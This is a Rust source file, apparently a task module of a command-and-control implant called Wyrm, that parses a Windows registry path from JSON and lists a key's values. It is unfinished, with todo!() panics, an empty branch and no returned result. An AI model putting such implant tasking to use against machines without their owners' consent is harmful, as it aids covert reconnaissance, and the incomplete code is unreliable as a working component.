use serde::Serialize;
use shared::{task_types::RegQueryInner, tasks::WyrmResult};
use windows_registry::{CLASSES_ROOT, CURRENT_USER, Key, LOCAL_MACHINE, Transaction, USERS};
use windows_sys::Win32::Foundation::GetLastError;

#[cfg(debug_assertions)]
use shared::pretty_print::print_failed;

pub fn reg_query(raw_input: &Option<String>) {
    let input_deser = match raw_input {
        Some(s) => match serde_json::from_str::<RegQueryInner>(s) {
            Ok(s) => s,
            Err(_) => todo!(),
        },
        None => todo!(),
    };

    // If the 2nd arg is empty, just query the key, otherwise query key + val
    if input_deser.1.is_none() {
        query_key(&input_deser.0);
    } else {
    }
}

pub enum RegistryError {
    CannotExtractKey,
}

fn query_key(path: &str) -> Option<impl Serialize> {
    let key = match extract_hive_from_str(path) {
        Ok(k) => k,
        Err(_) => return Some(WyrmResult::Err::<String>("Bad data".into())),
    };

    let path_stripped = match strip_hive(path) {
        Ok(p) => p,
        Err(_) => return Some(WyrmResult::Err::<String>("Bad data".into())),
    };

    //
    // Try open the key, in the event of an error - return
    //
    let open_key = match key.open(path_stripped) {
        Ok(k) => k,
        Err(e) => {
            let le = unsafe { GetLastError() };
            let msg = format!("Failed with status: {le:#X}");

            #[cfg(debug_assertions)]
            {
                let msg = format!("{msg}, from crate: {e}");
                print_failed(&msg);
            }

            return Some(WyrmResult::Err(msg));
        }
    };

    //
    // As we are querying the key itself, we need to iterate through it
    //

    let vals = match open_key.values() {
        Ok(v) => v,
        Err(e) => {
            let le = unsafe { GetLastError() };
            let msg = format!("Failed with status: {le:#X}");

            #[cfg(debug_assertions)]
            {
                let msg = format!("{msg}, from crate: {e}");
                print_failed(&msg);
            }

            return Some(WyrmResult::Err(msg));
        }
    };

    // We got the values, so iterate them - we need to reconstruct everything as a string to send back
    for v in vals {
        // todo..
        println!("String: {}, value: {:?}", v.0, v.1);
    }

    // todo should be the result
    None
}

fn strip_hive<'a>(path: &'a str) -> Result<&'a str, RegistryError> {
    let hive = match path.split_once(r"\") {
        Some(s) => s.1,
        None => return Err(RegistryError::CannotExtractKey),
    };

    Ok(hive)
}

/// Gets the hive from a given input str
fn extract_hive_from_str<'a>(path: &'a str) -> Result<&'a Key, RegistryError> {
    let hive = match path.split_once(r"\") {
        Some(s) => s.0,
        None => return Err(RegistryError::CannotExtractKey),
    };

    let key = match hive {
        "HKCU" => CURRENT_USER,
        "HKEY_CURRENT_USER" => CURRENT_USER,
        "HKLM" => LOCAL_MACHINE,
        "HKEY_LOCAL_MACHINE" => LOCAL_MACHINE,
        "HKCR" => CLASSES_ROOT,
        "HKEY_CLASSES_ROOT" => CLASSES_ROOT,
        "HKU" => USERS,
        "HKEY_USERS" => USERS,
        _ => return Err(RegistryError::CannotExtractKey),
    };

    Ok(key)
}
